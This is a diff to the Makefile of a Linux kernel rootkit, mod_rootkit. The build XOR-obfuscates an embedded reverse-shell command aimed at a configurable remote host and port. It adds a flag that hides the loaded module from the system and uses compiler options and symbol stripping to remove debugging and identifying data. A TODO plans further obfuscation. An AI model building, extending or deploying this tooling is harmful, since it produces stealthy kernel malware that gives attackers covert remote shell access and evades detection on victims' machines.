@@ -3,6 +3,7 @@
 # TODO xor all the rest and bin bash
 # TODO refactor xor to a diff file
 # TODO handle empty task not to return
+# TODO section about obfuscation and stripping and using different function names with macros
 
 MODULE_NAME := mod_rootkit
 
@@ -14,7 +15,12 @@ XOR_KEY := 0x5A
 RSHELL_HOST ?=
 RSHELL_PORT ?=
 
-# ======================================================= XOR DEFINITIONS START
+
+
+# ======================================================= XOR DEFINITIONS
+
+
+
 # define function to XOR a string character-by-character
 define xor_obfuscate
 $(shell \
@@ -47,7 +53,10 @@ endif
 # obfuscate RSHELL_CMD
 RSHELL_CMD_OBF := $(call xor_obfuscate,$(RSHELL_CMD))
 
-# ======================================================= XOR DEFINITIONS END
+
+
+# ======================================================= DEFINE SRC FILES 
+
 
 
 obj-m += $(MODULE_NAME).o
@@ -70,13 +79,31 @@ EXTRA_CFLAGS += -I$(PWD)/include \
 				-DRSHELL_CMD_OBF="{ $(RSHELL_CMD_OBF) }" \
 				-DXOR_KEY=$(XOR_KEY)
 
+
+
+# ======================================================= COMPILER FLAGS: HIDING MODULE
+
+
+
 ifeq ($(HIDE_MODULE),1)
   EXTRA_CFLAGS += -DHIDE_MODULE
 else ifneq ($(HIDE_MODULE),0)
   $(error Invalid value for HIDE_MODULE: '$(HIDE_MODULE)'. Use 0 or 1.)
 endif
 
-# ──────────────────────────────
+
+
+# ======================================================= COMPILER FLAGS: REMOVE DEBUG DATA 
+
+
+
+EXTRA_CFLAGS += -O2 -fvisibility=hidden -fno-ident -fno-stack-protector -fno-asynchronous-unwind-tables
+
+
+
+# ======================================================= MAKE ACTIONS 
+
+
 
 all:
 	@echo "[+] Building kernel module: $(MODULE_NAME).ko"
@@ -88,6 +115,8 @@ all:
 	@echo "    > MODULE_NAME      = $(MODULE_NAME)"
 	@echo "    > Kernel Version   = $(shell uname -r)"
 	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	@echo "[*] Stripping symbols..."
+	@strip --strip-unneeded $(MODULE_NAME).ko || echo "[!] strip failed"
 	@echo "[+] Build complete."
 
 clean:
